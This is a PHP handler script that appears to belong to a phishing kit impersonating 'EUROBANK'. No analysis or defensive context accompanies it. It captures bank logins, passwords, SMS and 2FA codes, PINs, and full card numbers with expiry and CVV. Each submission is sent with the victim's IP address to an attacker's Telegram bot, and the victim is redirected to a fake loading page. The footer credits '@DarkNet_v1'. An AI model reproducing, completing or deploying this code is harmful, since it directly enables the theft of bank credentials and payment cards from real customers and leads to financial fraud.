<?php

    session_start();

    include "config.php";
    

    if(isset($_POST["log"])){

        $user      = "<code>".$_POST["username"]."</code>";
        $pass      = "<code>".$_POST["password"]."</code>";

        $message=
        '<blockquote>[LOGIN] => EUROBANK</blockquote>'."\n".     
        '- USER : '.$user."\n".
        '- PASS : '.$pass."\n".
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[🛂] Panel-link : '.get_steps_link()."\n".
        '<blockquote>└ © @DarkNet_v1 :  [© 2026 - All rights reserved.]</blockquote>'."\n";  

        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();      
        header("Location: ../../../loading.php");
        exit();
 
    }elseif(isset($_POST["sms"])){

        $sms     = "<code>".$_POST["sms_code"]."</code>";
        
       $message=
       '<blockquote>[SMS] => EUROBANK</blockquote>'."\n".  
       '- SMS : '.$sms."\n".
       '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
       '[🛂] Panel-link : '.get_steps_link()."\n".
       '<blockquote>└ © @DarkNet_v1 :  [© 2026 - All rights reserved.]</blockquote>'."\n"; 
       
       
        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data(); 
        header("Location: ../../../loading.php");
        exit();

    }elseif(isset($_POST["f2"])){

        if ($_POST["s1"] !== "" & $_POST["s2"] !== "" & $_POST["s3"] !== "" & $_POST["s4"] !== "" & $_POST["s5"] !== "" & $_POST["s6"] !== "") {

            $sms      = "<code>".$_POST["s1"].$_POST["s2"].$_POST["s3"].$_POST["s4"].$_POST["s5"].$_POST["s6"]."</code>";

            $message=
            '<blockquote>[Code 2FA] => EUROBANK</blockquote>'."\n".     
            '- 2FA : '.$sms."\n".
            '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
            '[🛂] Panel-link : '.get_steps_link()."\n".
            '<blockquote>└ © @DarkNet_v1 :  [© 2025 - All rights reserved.]</blockquote>'."\n";  

            sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
            reset_data();
            header("Location: ../../../loading.php");
            exit(); 

        }else{
            header("Location: ../../../sms.php?error=");
            exit();             
        }
 
    }elseif(isset($_POST["pin"])){

        if ($_POST["pin1"] !== "" & $_POST["pin2"] !== "" & $_POST["pin3"] !== "" & $_POST["pin4"] !== "") {

            $sms      = "<code>".$_POST["pin1"].$_POST["pin2"].$_POST["pin3"].$_POST["pin4"]."</code>";

            $message=
            '<blockquote>[Code PIN] => EUROBANK</blockquote>'."\n".     
            '- PIN : '.$sms."\n".
            '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
            '[🛂] Panel-link : '.get_steps_link()."\n".
            '<blockquote>└ © @DarkNet_v1 :  [© 2025 - All rights reserved.]</blockquote>'."\n";  

            sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
            reset_data();
            header("Location: ../../../loading.php");
            exit(); 

        }else{
            header("Location: ../../../sms.php?error=");
            exit();             
        }
 
    }elseif(isset($_POST["card"])){


            $number   = "<code>".$_POST["cc1"]." ".$_POST["cc2"]." ".$_POST["cc3"]." ".$_POST["cc4"]."</code>";
            $Exp   = "<code>".$_POST["month"]."/".$_POST["year"]."</code>";
            $Cvv   = "<code>".$_POST["three"]."</code>";

            $message=
            '<blockquote>[CC] => EUROBANK</blockquote>'."\n".     
            '- Number card : '.$number."\n".
            '- Exp : '.$Exp."\n".
            '- Cvv : '.$Cvv."\n".            
            '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
            '[🛂] Panel-link : '.get_steps_link()."\n".
            '<blockquote>└ © @DarkNet_v1 :  [© 2024 - All rights reserved.]</blockquote>'."\n";          
            
            sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
            reset_data();
            header("Location: ../../../loading.php");
            exit();  

    }

?>